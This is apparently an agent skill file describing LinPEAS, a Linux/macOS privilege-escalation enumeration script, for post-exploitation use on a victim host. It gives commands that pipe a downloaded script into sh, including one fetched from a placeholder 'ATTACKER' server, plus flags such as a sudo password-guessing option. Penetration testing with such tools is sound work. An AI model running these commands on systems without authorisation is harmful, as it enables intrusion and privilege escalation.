---
name: linpeas
description: "LinPEAS: automated bash script enumerating Linux/macOS privilege escalation vectors including SUID binaries, writable paths, weak service configs, cron jobs, sudo rules, and kernel CVE indicators. Use post-exploitation as a low-privilege user on Linux or macOS to identify escalation paths."
license: MIT (PEASS-ng)
compatibility: "Linux / macOS / Unix. Pure bash — no root required to run."
metadata:
  author: AeonDave
  version: "1.0"
---

# LinPEAS

Linux/macOS privilege escalation enumeration script.

## Quick Start

```bash
# Download and run directly (victim with internet)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Host and deliver from attacker box
python3 -m http.server 8000   # attacker
curl http://ATTACKER:8000/linpeas.sh | sh   # victim

# Save output for review
./linpeas.sh -a 2>&1 | tee linpeas.out
```

## Key Flags

| Flag | Purpose |
|------|---------|
| `-a` | All checks (thorough) |
| `-q` | Quiet mode |
| `-s` | SuperFast — skip slow checks |
| `-P <pass>` | Try password against sudo prompts |

## Finding Categories

| Section | What it finds |
|---------|--------------|
| System info | OS/kernel version, CVE indicators |
| Users & groups | Sudo perms, passwd/shadow leaks |
| Files | SUID binaries, world-writable root dirs |
| Cron | World-writable cron scripts |
| Network | Open local ports, hosts file |
| Services | Weak permissions on service binaries |

## Interpreting Output

- **Red / yellow highlight** = high-confidence escalation vector
- Check all `99% PE —` lines first

## Resources

| File | When to load |
|------|--------------|
| `references/` | Manual exploitation of common findings |
